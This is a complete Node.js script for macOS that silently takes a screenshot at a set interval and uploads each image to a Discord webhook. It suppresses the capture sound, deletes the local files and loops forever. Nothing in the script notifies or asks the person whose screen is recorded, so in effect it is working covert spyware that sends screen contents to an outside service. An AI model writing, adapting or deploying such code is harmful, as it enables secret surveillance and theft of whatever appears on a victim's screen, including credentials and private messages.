var child_process = require("child_process");
var fs = require("fs");
var crypto = require("crypto");
var os = require("os");
var Discord = require("discord.js");

var config = require("./config");

var webhook = new Discord.WebhookClient(config.webhook.id, config.webhook.token);

(function capture() {
	var filename = `${new Date().toISOString()} ${encodeURIComponent(crypto.randomBytes(16).toString('base64'))}.jpg`
	var path = os.tmpdir() + '/' + filename;
	try {
		child_process.execSync(`screencapture -x -C -t jpg "${path}"`);
		var data = fs.readFileSync(path);
		webhook.send({files:[{
			attachment: data,
			name: filename
		}]}).finally(()=>{
			fs.unlink(path, ()=>{});
			setTimeout(capture, config.interval);
		});
	} catch(e) {
		setTimeout(capture, config.interval);
	}
})();
